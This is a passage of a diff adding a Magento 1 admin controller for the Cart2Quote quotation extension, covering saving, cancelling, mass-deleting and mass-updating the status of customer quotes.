+     * @return \Ophirah_Qquoteadv_Adminhtml_QquoteadvController
+     */
+    public function saveAction()
+    {
+        if (!Mage::helper('qquoteadv/license')->validLicense('create-edit-admin', $this->getRequest()->getPost('createHash'))) {
+            Mage::getSingleton('adminhtml/session')->addError($this->__("Please upgrade to Cart2Quote Starter or higher to use this feature"));
+            $this->_redirectReferer();
+            return null;
+        }
+
+        // Retrieve Post data
+        $data = $this->getRequest()->getPost();
+
+        //event
+        Mage::dispatchEvent('ophirah_qquoteadv_admin_save_before', [$data]);
+
+        //event specific event
+        $event = $this->getRequest()->getParam('event');
+        if ($event) {
+            Mage::dispatchEvent('ophirah_qquoteadv_admin_save_before_' . $event, [$data]);
+        }
+
+        $pdfPrint = false;
+        // If save is called from creating PDF
+        if (isset($this->_flags['qquoteadv']['print'])) {
+            if ($this->_flags['qquoteadv']['print'] === true) {
+                $data = $this->_postData;
+                $pdfPrint = true;
+            }
+        }
+
+        if (isset($data)) {
+            try {
+                if (isset($data['product']) && is_array($data['product']) && count($data['product']) > 0) {
+                    $quoteId = (int)$this->getRequest()->getParam('id');
+                    if ($quoteId) {
+                        /** @var \Ophirah_Qquoteadv_Model_Qqadvcustomer $_quoteadv */
+                        $_quoteadv = $this->getQuotationQuote($quoteId);
+                        Mage::dispatchEvent('qquoteadv_qqadvcustomer_before_saveaction', ['quote' => $_quoteadv]);
+                        //event specific event
+                        $event = $this->getRequest()->getParam('event');
+                        if ($event) {
+                            Mage::dispatchEvent('qquoteadv_qqadvcustomer_before_saveaction_' . $event, ['quote' => $_quoteadv]);
+                        }
+
+                        // Setting Extra Options
+                        if (isset($data['extra_options'])) {
+                            if (!is_array($data['extra_options'])) {
+                                $data['extra_options'] = [$data['extra_options']];
+                            }
+
+                            foreach ($data['extra_options'] as $key => $option) {
+                                if (is_array($option)) {
+                                    $option = implode(',', $option);
+                                }
+                                $_quoteadv->setData($key, $option);
+                            }
+                        }
+
+                        if(isset($data['store'])){
+                            $_quoteadv->setStoreId($data['store']);
+                        }
+
+                        // Rate gets calculated from base=>quoterate
+                        $rate = $_quoteadv->getBase2QuoteRate();
+
+                        $errors = [];
+                        foreach ($data['product'] as $id => $arr) {
+                            $price = $arr['price'];
+                            $qty = $arr['qty'];
+                            $model = Mage::getModel('qquoteadv/requestitem')->load($id);
+                            $productId = $model->getProductId();
+
+                            $quoteProduct = Mage::getModel('qquoteadv/qqadvproduct')->getQuoteItemChildren((int)$productId, $model->getQuoteadvProductId());
+
+                            // Creating ChildProducts array
+                            // in case product has a product type Bundle
+                            // All childproducts need to be checked
+                            $checkQty = $qty;
+                            $checkProductArray = [];
+                            // Parent product gets added first
+                            $checkProductArray[] = $quoteProduct;
+                            if(isset($quoteProduct) && is_object($quoteProduct)){
+                                if ($quoteProduct->getChildren()) {
+                                    $checkProductArray = array_merge($checkProductArray, $quoteProduct->getChildren());
+                                }
+                            }
+
+                            // Cycle through childproducts
+                            foreach ($checkProductArray as $checkProduct) {
+                                if ($checkProduct->getQuoteItemQty()) {
+                                    $checkQty = $checkProduct->getQuoteItemQty();
+
+                                    if(is_array($checkQty)){
+                                        //bad way of getting the first value of the array
+                                        foreach($checkQty as $qtyValue){
+                                            $checkQty = $qtyValue;
+                                            break;
+                                        }
+                                    }
+                                }
+                                //echo 'save action: ';
+                                $check = Mage::helper('qquoteadv')->isQuoteable($checkProduct, $checkQty);
+                            }
+
+                            if (isset($check) && $check->getHasErrors()) {
+                                $errors = $check->getErrors();
+                                //#return back in case any error found
+                                if ($pdfPrint === true) {
+                                    return $errors;
+                                } else {
+                                    if (count($errors)) {
+                                        $lastMessage = null;
+                                        foreach ($errors as $message) {
+                                            if ($message != $lastMessage) {
+                                                $message .= $this->__('Quote could not be saved.');
+                                                Mage::getSingleton('adminhtml/session')->addError('<br />'.$message);
+                                            }
+                                            $lastMessage = $message;
+                                        }
+                                    }
+                                    if(isset($quoteId) && isset($data['redirect2neworder']) && $data['redirect2neworder'] == 1){
+                                        //continue with error
+                                        foreach ($errors as $message) {
+                                            Mage::log('Message: ' .$message, null, 'c2q.log');
+                                        }
+                                    } else {
+                                        return $this->_redirect('*/*/edit', ['id' => $quoteId]);
+                                    }
+                                }
+                            }
+
+                            try {
+                                $model->setOwnerCurPrice($price);
+                                $basePrice = $price / $rate;
+                                $model->setOwnerBasePrice($basePrice);
+
+                                $model->save();
+                            } catch (Exception $e) {
+                                $errors[] = $this->__("Item #%s was't updated", $id);
+                                Mage::log('Exception: ' .$e->getMessage(), null, 'c2q_exception.log', true);
+                            }
+                        }
+
+                        if (is_array($data['requestedproduct']) && count($data['requestedproduct']) > 0) {
+
+                            $errors = [];
+                            $counter = 0;
+                            foreach ($data['requestedproduct'] as $clientRequestId => $clientRequestData) {
+
+                                //if($client_request = $arr['client_request']){
+                                $client_request = $clientRequestData['client_request'];
+                                $comment = trim(strip_tags($client_request));
+
+                                try {
+                                    $requestItemId = $data['q2o'][$counter];
+
+                                    //use more solid way of getting the request item id on newer admin templates v6.2.3
+                                    //this fixes the comments not always sticking to the request item on sorting
+                                    foreach ($data['product'] as $requestItemIdProduct => $product) {
+                                        if (in_array($requestItemIdProduct, $data['q2o'])
+                                            && isset($product['requestedproduct'])
+                                            && $product['requestedproduct'] == $clientRequestId
+                                        ) {
+                                            $requestItemId = $requestItemIdProduct;
+                                        }
+                                    }
+
+                                    $qquoteadvItem = Mage::getModel('qquoteadv/requestitem')->load($requestItemId);
+                                    $qquoteadvProduct = Mage::getModel('qquoteadv/qqadvproduct')->load($qquoteadvItem->getQuoteadvProductId());
+                                    $qquoteadvProduct->setClientRequest($comment);
+
+                                    // Update tier qty
+                                    if ($data['product'][$requestItemId]['qty']) {
+                                        $newQty = $data['product'][$requestItemId]['qty'];
+                                        $attribute = unserialize($qquoteadvProduct->getAttribute());
+                                        $attribute['qty'] = $newQty;
+                                        $qquoteadvProduct->setAttribute(serialize($attribute));
+                                        $qquoteadvProduct->setQty($newQty);
+                                    }
+                                    $qquoteadvProduct->save();
+                                } catch (Exception $e) {
+                                    if (isset($qquoteadvItem)) {
+                                        $errors[] = $this->__("Item #%s was't updated", $qquoteadvItem->getProductId());
+                                    }
+
+                                    Mage::log('Exception: ' . $e->getMessage(), null, 'c2q_exception.log', true);
+                                }
+
+                                $counter++;
+                            }
+                        }
+
+                        //File upload
+                        $fileIncrementNumber = 0;
+                        foreach($_FILES as $file) {
+                            $fileTitleToAdd = $this->getRequest()->getParam('file_title_'.$fileIncrementNumber);
+                            $_quoteadv->uploadFile($fileTitleToAdd, 'file_path_'.$fileIncrementNumber);
+                            $fileIncrementNumber++;
+                        }
+
+
+                        //File removal
+                        foreach($this->getRequest()->getParams() as $key => $imageTitle){
+                            if(substr($key, 0, 12) == "removeImage_"){
+                                $imageRemoveSuccessfully = $_quoteadv->removeFile($imageTitle);
+
+                                if(!$imageRemoveSuccessfully){
+                                    $this->_getSession()->addError($this->__('Unable to remove the file.'));
+                                }
+                            }
+                        }
+
+                        // Setting Status
+                        if (isset($data['status'])) {
+                            // Auto update to proposal sent
+                            if ($this->getRequest()->getParam('back')) {
+                                $oldStatus = $_quoteadv->getStatus();
+                                $oldSubstatus = $_quoteadv->getSubstatus();
+                                $_quoteadv->setStatus(Ophirah_Qquoteadv_Model_Status::STATUS_PROPOSAL);
+                                $_quoteadv->setSubstatus();
+                                // Setting Proposal sent date and time
+                                $_quoteadv->setProposalSent(now());
+                            } elseif (!$this->getRequest()->getParam('hold')) {
+                                // check for status and substatus
+                                // @var Varien_Object
+                                $status = Mage::getModel('qquoteadv/substatus')->getStatus($data['status']);
+                                $substatus = Mage::getModel('qquoteadv/substatus')->getSubstatus($data['status']);
+                                $_quoteadv->setStatus($status);
+                                $_quoteadv->setSubstatus($substatus);
+                            }
+                        }
+
+                        // Client Request
+                        $client_request = $this->getRequest()->getParam('client_request');
+                        if ($client_request) {
+                            $comment = trim(strip_tags($client_request));
+                            $_quoteadv->setClientRequest($comment);
+                        } else {
+                            $_quoteadv->setClientRequest();
+                        }
+
+                        // Internal Comment
+                        $internal_comment = $this->getRequest()->getParam('internal_comment');
+                        if ($internal_comment) {
+                            $internalComment = trim(strip_tags($internal_comment));
+                            $_quoteadv->setInternalComment($internalComment);
+                        } else {
+                            $_quoteadv->setInternalComment();
+                        }
+
+                        // Get date format
+                        $dateFormat = Mage::app()->getLocale()->getDateFormat(Mage_Core_Model_Locale::FORMAT_TYPE_SHORT);
+
+                        // Expiry date
+                        $expiry = $this->getRequest()->getParam('expiry');
+                        if ($expiry) {
+                            $expiryFormatted = Mage::app()->getLocale()->date($expiry, $dateFormat, null, false);
+                            $_quoteadv->setExpiry($expiryFormatted->toString(Varien_Date::DATETIME_INTERNAL_FORMAT));
+                        }
+                        $no_expiry = ($this->getRequest()->getParam('no_expiry') && $this->getRequest()->getParam('no_expiry') == "on") ? 1 : 0;
+                        $_quoteadv->setNoExpiry($no_expiry);
+
+                        // Reminder
+                        $reminder = $this->getRequest()->getParam('reminder');
+                        if ($reminder) {
+                            $reminderFormatted = Mage::app()->getLocale()->date($reminder, $dateFormat, null, false);
+                            $_quoteadv->setReminder($reminderFormatted->toString(Varien_Date::DATETIME_INTERNAL_FORMAT));
+                        }
+                        $no_reminder = ($this->getRequest()->getParam('no_reminder') && $this->getRequest()->getParam('no_reminder') == "on") ? 1 : 0;
+                        $_quoteadv->setNoReminder($no_reminder);
+
+                        // Follow Up
+                        $followup = $this->getRequest()->getParam('followup');
+                        if ($followup) {
+                            $followupFormatted = Mage::app()->getLocale()->date($followup, $dateFormat, null, false);
+                            $_quoteadv->setFollowup($followupFormatted->toString(Varien_Date::DATETIME_INTERNAL_FORMAT));
+                        }
+                        $no_followup = ($this->getRequest()->getParam('no_followup') && $this->getRequest()->getParam('no_followup') == "on") ? 1 : 0;
+                        if ($no_followup == 1) {
+                            $_quoteadv->setFollowup(); //clear date
+                            $_quoteadv->setNoFollowup(0); //clear checked
+                        }
+                        // Show item price
+                        if ($this->getRequest()->getParam('itemprice') == "on") {
+                            $_quoteadv->setData('itemprice', 1);
+                        } else {
+                            $_quoteadv->setData('itemprice', 0);
+                        }
+
+                        // Alternative Checkout Page
+                        if ($this->getRequest()->getParam('alt_checkout') == "on") {
+                            $_quoteadv->setData('alt_checkout', 1);
+                        } elseif (Mage::getStoreConfig('qquoteadv_advanced_settings/checkout/checkout_alternative', $_quoteadv->getData('store_id')) > 0) {
+                            $_quoteadv->setData('alt_checkout', 1);
+                        } else {
+                            $_quoteadv->setData('alt_checkout', 0);
+                        }
+
+                        // Salesrule
+                        $salesrule = $this->getRequest()->getParam('salesrule');
+                        if ($salesrule) {
+                            $_quoteadv->setSalesrule($salesrule);
+                            //collect totals is needed
+                            if(!Mage::getStoreConfig('qquoteadv_advanced_settings/backend/calculate_quote_totals_on_load')){
+                                //but only when it isn't done on page load
+                                $_quoteadv->collectTotals();
+                            }
+                        } else {
+                            if ($salesrule !== null) {
+                                //salesrule is "0", remove salesrule
+                                if ($_quoteadv->getSalesrule() != null) {
+                                    $_quoteadv->setSalesrule(null);
+                                    //collect totals is needed
+                                    if (!Mage::getStoreConfig('qquoteadv_advanced_settings/backend/calculate_quote_totals_on_load')) {
+                                        //but only when it isn't done on page load
+                                        $_quoteadv->collectTotals();
+                                    }
+                                }
+                            }
+                        }
+
+                        // Assign Salesrep
+                        $assignedTo = $this->getRequest()->getParam('assigned_to');
+                        if ($assignedTo) {
+                            $saveas = Mage::getModel('admin/user')->load($assignedTo);
+                            if (!$saveas->getUserId()) {
+                                Mage::getSingleton('adminhtml/session')->addError($this->__('Could not find user with id: %s', $assignedTo));
+                                $saveas = Mage::getSingleton('admin/session')->getUser();
+                            }
+                        } else {
+                            $saveas = Mage::getSingleton('admin/session')->getUser();
+                            //check for an assigned sales rep
+                            if($_quoteadv->getCustomerId()){
+                                $customer = Mage::getModel('customer/customer')->load($_quoteadv->getCustomerId());
+                                if($customer && $customer->getAssignedSalesRep()){
+                                    $saveas = Mage::getModel('admin/user')->load($customer->getAssignedSalesRep());
+                                }
+                            }
+                        }
+
+                        $oldSalesRep = $_quoteadv->getUserId();
+                        $_quoteadv->setUserId($saveas->getUserId());
+
+                        //#save shipping price
+                        $shippingType = $this->getRequest()->getPost("shipping_type", "");
+                        $shippingPrice = $this->getRequest()->getPost("shipping_price", -1);
+
+                        $quoteStoreId = $_quoteadv->getStoreId();
+                        $priceContainsTax = Mage::helper('tax')->shippingPriceIncludesTax($quoteStoreId);
+                        if ($priceContainsTax) {
+                            //fallback for situations where getWebsite doesn't return a object
+                            if(is_object(Mage::app()->getWebsite(true))){
+                                $store = Mage::app()->getWebsite(true)->getDefaultGroup()->getDefaultStore();
+                            } else {
+                                $store = Mage::app()->getStore('default');
+                                $message = 'Mage::app()->getWebsite(true) is not a object, fallback applied';
+                                Mage::log('Message: ' .$message, null, 'c2q.log');
+                            }
+
+                            $taxCalculation = Mage::getModel('tax/calculation');
+                            $customer = $_quoteadv->getCustomer();
+                            if ($customer) {
+                                $taxCalculation->setCustomer($customer);
+                            }
+                            $request = $taxCalculation->getRateOriginRequest($store);
+
+                            //get shipping tax id (store)
+                            $taxClassId = Mage::helper('tax')->getShippingTaxClass($store);
+                            $percent = $taxCalculation->getRate($request->setProductClassId($taxClassId));
+
+                            $quoteStore = Mage::getModel('core/store')->load($quoteStoreId);
+                            $taxCalculation = Mage::getModel('tax/calculation');
+                            $customer = $_quoteadv->getCustomer();
+                            if ($customer) {
+                                $taxCalculation->setCustomer($customer);
+                            }
+                            $request = $taxCalculation->getRateRequest(null, null, null, $quoteStore);
+
+                            //get shipping tax id (quote)
+                            $taxClassId = Mage::helper('tax')->getShippingTaxClass($store);
+                            $quotePercent = $taxCalculation->getRate($request->setProductClassId($taxClassId));
+
+                            if($percent != $quotePercent){
+                                //100/((100+($percent-$quotePercent))/100);
+                                $rateFix = 100/((100+$percent)/100);
+                                $rateFix = $rateFix*((100+$quotePercent)/100);
+                                $rateFix = 100/$rateFix;
+
+                                $shippingPrice = $shippingPrice * $rateFix;
+                            }
+                        }
+
+                        //set shipping data from post data and save old data
+                        //$orgShippingType = $_quoteadv->getShippingType();
+                        //$orgShippingPrice = $_quoteadv->getShippingPrice();
+                        $_quoteadv->setShippingType($shippingType);
+                        $_quoteadv->setShippingPrice($shippingPrice);
+                        $shippingBasePrice = $shippingPrice / $rate;
+                        $_quoteadv->setShippingBasePrice($shippingBasePrice);
+
+                        $_quoteadv->setUpdatedAt(Mage::getSingleton('core/date')->gmtDate());
+
+                        $userId = $_quoteadv->getUserId();
+                        if (empty($userId)) {
+                            $adm_id = Mage::getSingleton('admin/session')->getUser()->getId();
+
+                            //check for an assigned sales rep
+                            if($_quoteadv->getCustomerId()){
+                                $customer = Mage::getModel('customer/customer')->load($_quoteadv->getCustomerId());
+                                if($customer && $customer->getAssignedSalesRep()){
+                                    $adm_id = $customer->getAssignedSalesRep();
+                                }
+                            }
+
+                            $_quoteadv->setUserId($adm_id);
+                        } else {
+                            $model = Mage::getModel('admin/user')->load($userId);
+                            //#admin is not exists
+                            if (!$model->getId() && isset($id) && $id) {
+                                $adm_id = Mage::getSingleton('admin/session')->getUser()->getId();
+                                $_quoteadv->setUserId($adm_id);
+                            }
+                        }
+
+                        // Unset data from sales rep if not allowed
+                        if (!Mage::getSingleton('admin/session')->isAllowed('sales/qquoteadv/salesrep')) {
+                            $_quoteadv->setUserId($_quoteadv->getOrigData('user_id'));
+                        }
+
+                        try {
+                            $shippingType = $_quoteadv->getShippingType();
+                            if ($shippingType == "I" || $shippingType == "O") {
+
+                                // Add Cart2Quote shippingrate
+                                $shippingPrice = $_quoteadv->getShippingPrice();
+                                $carrier = Mage::getStoreConfig("carriers/qquoteshiprate/title", $_quoteadv->getStoreId());
+                                $method = Mage::getStoreConfig("carriers/qquoteshiprate/name", $_quoteadv->getStoreId());
+                                $methodDescription = $carrier . " - " . $method;
+
+                                $rateData = Mage::getModel('qquoteadv/quoteshippingrate');
+                                $rateData->setData('carrier', 'qquoteshiprate');
+                                $rateData->setData('carrier_title', $carrier);
+                                $rateData->setData('code', 'qquoteshiprate_qquoteshiprate');
+                                $rateData->setData('method_description', $methodDescription);
+                                $rateData->setData('price', $shippingPrice / $rate);
+                                $rateData->setData('method', 'qquoteshiprate');
+                                $rateData->setData('method_title', $method);
+
+                                $_quoteadv->setShippingMethod($rateData);
+                            } elseif (is_integer((int)$shippingType)) {
+                                // Default Shipping Method
+                                $_quoteadv->getAddress();
+                                $rateData = Mage::getModel('qquoteadv/quoteshippingrate')->load($shippingType);
+                                if ($rateData) {
+                                    $_quoteadv->setShippingMethod($rateData);
+                                }
+                            } else {
+                                // Remove Shipping Method
+                                $_quoteadv->unsetShippingMethod();
+                            }
+
+                            // Quote Price Recalculation
+                            $recalPrice = $this->getRequest()->getParam('recal_price');
+                            if ($recalPrice) {
+                                $validRecalPrice = false;
+
+                                //check fixed price
+                                if ($recalPrice['fixed'] != "") {
+                                    $fixedPriceNummeric = is_numeric($recalPrice['fixed']);
+                                    $fixedPriceInvalid = ($recalPrice['fixed'] != null && $fixedPriceNummeric && !((float)$recalPrice['fixed'] >= 0));
+
+                                    if ($fixedPriceInvalid || !$fixedPriceNummeric) {
+                                        Mage::getSingleton('adminhtml/session')->addNotice($this->__('Quote Reduction was not a valid decimal number'));
+                                    } else {
+                                        $validRecalPrice = true;
+                                    }
+                                }
+
+                                //check percentage price
+                                if ($recalPrice['percentage'] != "") {
+                                    $percentagePriceNummeric = is_numeric($recalPrice['percentage']);
+                                    $percentagePriceInvalid = ($recalPrice['percentage'] != null && $percentagePriceNummeric && !((float)$recalPrice['percentage'] >= 0));
+
+                                    if ($percentagePriceInvalid || !$percentagePriceNummeric) {
+                                        Mage::getSingleton('adminhtml/session')->addNotice($this->__('Quote Reduction was not a valid decimal number'));
+                                    } else {
+                                        $validRecalPrice = true;
+                                    }
+                                }
+
+                                //recalulate price if given recal price is valid
+                                if ($validRecalPrice) {
+                                    if ($_quoteadv->recalculateFixedPrice($recalPrice)) {
+                                        $_quoteadv->setTotalsCollectedFlag(false); //force recalculation
+                                    } else {
+                                        Mage::getSingleton('adminhtml/session')->addError($this->__('Could not recalculate Quote Price'));
+                                    }
+                                }
+                            }
+
+                            //generate shipping prices
+                            $_quoteadv->save();
+                            $shippingAddress = $_quoteadv->getShippingAddress();
+                            if($shippingAddress){
+                                $shippingAddress->requestShippingRates();
+                            }
+
+                            //trigger collect totals if needed
+                            $collectTotalsOnPageLoad = Mage::getStoreConfig('qquoteadv_advanced_settings/backend/calculate_quote_totals_on_load');
+//                            if ($orgShippingType != $shippingType || $orgShippingPrice != $shippingPrice) {
+//                                //collect totals is needed
+//                                if (!$collectTotalsOnPageLoad) {
+//                                    //but only when it isn't done on page load
+//                                    $_quoteadv->setTotalsCollectedFlag(false); //force recalculation
+//                                    $_quoteadv->collectTotals();
+//                                }
+//                            } else {
+                                //collect totals after all needed actions
+                                if (!$collectTotalsOnPageLoad) {
+                                    //but only when it isn't done on page load
+                                    $_quoteadv->setTotalsCollectedFlag(false); //force recalculation
+                                    $_quoteadv->collectTotals();
+                                    $_quoteadv->save();
+                                }
+//                            }
+
+                            $this->_quoteadv = $_quoteadv;
+
+                        } catch (Exception $e) {
+                            Mage::log('Exception: ' .$e->getMessage(), null, 'c2q_exception.log', true);
+                        }
+
+                        // unset flag and data from creating PDF method
+                        if ($pdfPrint === true) {
+                            $this->setFlag('qquoteadv', 'print', false);
+                            unset($this->_postData);
+                            return $this;
+                        }
+
+                        if ($this->getRequest()->getParam('back')) {
+                            Mage::helper('qquoteadv/logging')->sentAnonymousData('save', 'b', $quoteId);
+
+                            // Check for negative profit
+                            if (Mage::getStoreConfig('qquoteadv_quote_configuration/proposal/profit', $_quoteadv->getData('store_id')) != 1) {
+                                $profit = $_quoteadv->getQuoteProfit();
+
+                                if ($profit < 0 && isset($oldStatus) && isset($oldSubstatus)) {
+                                    // Reverting status
+                                    $_quoteadv->setStatus($oldStatus);
+                                    $_quoteadv->setSubstatus($oldSubstatus);
+                                    $_quoteadv->save();
+                                    $this->_quoteadv = $_quoteadv;
+                                    Mage::getSingleton('adminhtml/session')->addNotice($this->__('Proposal was not sent, no profit'));
+                                    $this->_redirect('*/*/edit', ['id' => $quoteId]);
+                                    return null;
+                                }
+                            }
+
+                            $realQuoteadvId = $_quoteadv->getIncrementId() ? $_quoteadv->getIncrementId() : $_quoteadv->getId();
+
+                            //#send Proposal email
+                            $customerId = $_quoteadv->getCustomerId();
+                            if ($customerId) {
+                                Mage::register('qquoteadv', $_quoteadv);
+                                $this->_sendProposalEmail($customerId, $realQuoteadvId, $_quoteadv->getId());
+                                Mage::unregister('qquoteadv');
+                            }
+                        }
+
+                        // check for hold status
+                        $hold = $this->getRequest()->getParam('hold');
+                        if ($hold) {
+                            if ($hold == 1) { // Set Quote to 'Hold'
+                                if (Mage::getModel('qquoteadv/substatus')->getParentStatus($_quoteadv->getSubstatus()) != $_quoteadv->getStatus()) {
+                                    $_quoteadv->setSubstatus($_quoteadv->getStatus());
+                                }
+                                $_quoteadv->setStatus(Ophirah_Qquoteadv_Model_Status::STATUS_PROPOSAL_SAVED);
+                                Mage::getSingleton('adminhtml/session')->addSuccess($this->__('Quote is currently on hold'));
+                            } elseif ($hold == 2) { // Set Quote to 'Unhold'
+                                $statusses = Mage::getModel('qquoteadv/substatus')->getStatuses($_quoteadv->getSubstatus());
+                                $status = Mage::getModel('qquoteadv/substatus')->getStatus($_quoteadv->getSubstatus());
+                                $substatus = Mage::getModel('qquoteadv/substatus')->getSubstatus($_quoteadv->getSubstatus());
+                                if ($statusses) {
+                                    $statusses->checkUnholdStatus($_quoteadv);
+                                    Mage::getSingleton('adminhtml/session')->addSuccess($this->__('Quote is succesfully unhold!'));
+                                    $_quoteadv->setStatus($status);
+                                    $_quoteadv->setSubstatus($substatus);
+                                } else {
+                                    Mage::getSingleton('adminhtml/session')->addNotice($this->__('Old status could not be determined'));
+                                    $_quoteadv->setStatus(Ophirah_Qquoteadv_Model_Status::STATUS_REQUEST);
+                                }
+                            }
+                            $_quoteadv->save();
+                            $this->_quoteadv = $_quoteadv;
+                            Mage::dispatchEvent('qquoteadv_qqadvcustomer_aftersave_final', ['quote' => $_quoteadv]);
+                            Mage::dispatchEvent('qquoteadv_qqadvcustomer_after_saveaction', ['quote' => $_quoteadv]);
+                            //event specific event
+                            $event = $this->getRequest()->getParam('event');
+                            if ($event) {
+                                Mage::dispatchEvent('qquoteadv_qqadvcustomer_aftersave_final_' . $event, ['quote' => $_quoteadv]);
+                                Mage::dispatchEvent('qquoteadv_qqadvcustomer_before_saveaction_' . $event, ['quote' => $_quoteadv]);
+                            }
+                        }
+                    }
+                }
+
+                //check if $_quoteadv is set
+                if (!isset($_quoteadv) || empty($_quoteadv)) {
+                    $quoteId = (int)$this->getRequest()->getParam('id');
+                    if ($quoteId) {
+                        $_quoteadv = $this->getQuotationQuote($quoteId);
+                    } else {
+                        $_quoteadv = $this->getQuotationQuote();
+                    }
+                }
+
+                // Send email to the new salesrep when assigned to the quote
+                if (isset($saveas) && $saveas->getUserId()) {
+                    if (!isset($oldSalesRep) || ($oldSalesRep != $saveas->getUserId())) {
+                        $this->sendEmailSalesRep($_quoteadv, $saveas);
+                    }
+                }
+
+                //check for errors
+                if (count(Mage::getSingleton('adminhtml/session')->getMessages()->getErrors())) {
+                    Mage::getSingleton('adminhtml/session')->addNotice($this->__('Quote was saved with errors'));
+                    Mage::dispatchEvent('qquoteadv_qqadvcustomer_aftersave_final_error', ['quote' => $_quoteadv]);
+                    //event specific event
+                    $event = $this->getRequest()->getParam('event');
+                    if ($event) {
+                        Mage::dispatchEvent('qquoteadv_qqadvcustomer_aftersave_final_error_' . $event, ['quote' => $_quoteadv]);
+                    }
+                } else {
+                    Mage::getSingleton('adminhtml/session')->addSuccess($this->__('Quote was successfully saved'));
+                    Mage::dispatchEvent('qquoteadv_qqadvcustomer_aftersave_final_success', ['quote' => $_quoteadv]);
+                    //event specific event
+                    $event = $this->getRequest()->getParam('event');
+                    if ($event) {
+                        Mage::dispatchEvent('qquoteadv_qqadvcustomer_aftersave_final_success_' . $event, ['quote' => $_quoteadv]);
+                    }
+                }
+
+                Mage::getSingleton('adminhtml/session')->setFormData(false);
+
+                if (isset($quoteId)) {
+                    if (isset($data['redirect2neworder']) && $data['redirect2neworder'] == 1) {
+                        $this->_redirect(
+                            '*/*/convert/', [
+                                              'id'         => $quoteId,
+                                              'q2o_serial' => base64_encode(json_encode($data['q2o']))
+                            ]
+                        );
+                    } elseif ($this->getRequest()->getParam('back')) {
+                        $this->_redirect('*/*/edit', ['id' => $quoteId]);
+                    } else {
+                        $this->_redirectAnhcor('*/*/edit', ['id' => $quoteId], '#products');
+                        Mage::getSingleton("core/session")->setCollectTotals(1);
+                    }
+                } else {
+                    $this->_redirect('*/*/');
+                }
+
+                return null;
+            } catch (Exception $e) {
+                Mage::log('Exception: ' .$e->getMessage(), null, 'c2q_exception.log', true);
+                Mage::getSingleton('adminhtml/session')->addError($e->getMessage());
+                Mage::getSingleton('adminhtml/session')->setFormData($data);
+                $this->_redirect('*/*/edit', ['id' => $this->getRequest()->getParam('id')]);
+                return null;
+            }
+        }
+
+        Mage::getSingleton('adminhtml/session')->addError($this->__('Unable to find item to save'));
+        $this->_redirect('*/*/');
+
+        Mage::dispatchEvent('ophirah_qquoteadv_admin_save_after', [$data]);
+
+        //event specific event
+        $event = $this->getRequest()->getParam('event');
+        if ($event) {
+            Mage::dispatchEvent('ophirah_qquoteadv_admin_save_after_' . $event, [$data]);
+        }
+
+        return null;
+    }
+
+    /**
+     * Action to cancel a given quote
+     */
+    public function deleteAction()
+    {
+        $id = (int)$this->getRequest()->getParam('id');
+        Mage::dispatchEvent('ophirah_qquoteadv_admin_delete_before', [$id]);
+
+        if ($id > 0) {
+            try {
+                $model = $this->getQuotationQuote($id);
+                $model->setStatus(Ophirah_Qquoteadv_Model_Status::STATUS_CANCELED); //STATUS_REJECTED
+                $model->save();
+                Mage::dispatchEvent('qquoteadv_qqadvcustomer_aftercancel', ['quote' => $model]);
+
+                Mage::getSingleton('adminhtml/session')->addSuccess($this->__('Quote was successfully canceled'));
+                Mage::helper('qquoteadv/logging')->sentAnonymousData('cancel', 'b', $id);
+                $this->_redirect('*/*/');
+            } catch (Exception $e) {
+                Mage::log('Exception: ' .$e->getMessage(), null, 'c2q_exception.log', true);
+                Mage::getSingleton('adminhtml/session')->addError($e->getMessage());
+                $this->_redirect('*/*/edit', ['id' => $this->getRequest()->getParam('id')]);
+            }
+        }
+
+        $this->_redirect('*/*/');
+        Mage::dispatchEvent('ophirah_qquoteadv_admin_delete_after', [$id]);
+    }
+
+    /**
+     * Mass delete action (used in the grid)
+     */
+    public function massDeleteAction()
+    {
+        //The user must have permission for "mass delete quote" to use this
+        if (!Mage::getSingleton('admin/session')->isAllowed('sales/qquoteadv/actions/massdelete')) {
+            Mage::getSingleton('adminhtml/session')->addError(
+                Mage::helper('qquoteadv')->__('Mass delete action is only allowed for users with permission "Mass Delete Quote".')
+            );
+            $this->_redirect('*/*/index');
+            return;
+        }
+
+        $qquoteIds = $this->getRequest()->getParam('qquote');
+        Mage::dispatchEvent('ophirah_qquoteadv_admin_massDelete_before', [$qquoteIds]);
+
+        if (!is_array($qquoteIds)) {
+            Mage::getSingleton('adminhtml/session')->addError(Mage::helper('catalog')->__('Please select items.'));
+        } else {
+            try {
+                foreach ($qquoteIds as $qquoteId) {
+                    $qquote = Mage::getModel('qquoteadv/qqadvcustomer')->load($qquoteId);
+                    Mage::dispatchEvent('qquoteadv_qqadvcustomer_beforedelete_massDelete', ['quote' => $qquote]);
+                    //$qquote->delete();
+                    $qquote->setIsQuote(3);
+                    $qquote->setStatus(Ophirah_Qquoteadv_Model_Status::STATUS_CANCELED);
+                    $qquote->save();
+                    Mage::dispatchEvent('qquoteadv_qqadvcustomer_afterdelete_massDelete', ['quote' => $qquote]);
+                }
+                Mage::getSingleton('adminhtml/session')->addSuccess(
+                    Mage::helper('adminhtml')->__('Total of %d record(s) were deleted', count($qquoteIds))
+                );
+            } catch (Exception $e) {
+                Mage::log('Exception: ' .$e->getMessage(), null, 'c2q_exception.log', true);
+                Mage::getSingleton('adminhtml/session')->addError($e->getMessage());
+            }
+        }
+
+        $this->_redirect('*/*/index');
+        Mage::dispatchEvent('ophirah_qquoteadv_admin_massDelete_after', [$qquoteIds]);
+    }
+
+    /**
+     * Set Status and substatus for quote
+     *
+     */
+    public function massStatusAction()
+    {
+        $qquoteIds = $this->getRequest()->getParam('qquote');
+        Mage::dispatchEvent('ophirah_qquoteadv_admin_massStatus_before', [$qquoteIds]);
+
+        if (!is_array($qquoteIds)) {
+            Mage::getSingleton('adminhtml/session')->addError(Mage::helper('catalog')->__('Please select items.'));
+        } else {
+            try {
+                $requestStatus = $this->getRequest()->getParam('status');
+                $status = Mage::getModel('qquoteadv/status')->getStatus($requestStatus);
+                if(is_object($status)){
+                    $status = $status->getStatus();
+                }
+
+                foreach ($qquoteIds as $qquoteId) {
+                    $qquote = Mage::getSingleton('qquoteadv/qqadvcustomer')->load($qquoteId);
+                    if ($status == Ophirah_Qquoteadv_Model_Status::STATUS_PROPOSAL_SAVED) {
+                        if ($qquote->getStatus() != Ophirah_Qquoteadv_Model_Status::STATUS_PROPOSAL_SAVED) {
+                            $qquote->setSubstatus($qquote->getStatus());
+                        }
+                    } else {
+                        $qquote->unsetSubStatus();
+                    }
+
+                    $qquote->setStatus($status);
+                    $qquote->setIsMassupdate(true);
+                    $qquote->save();
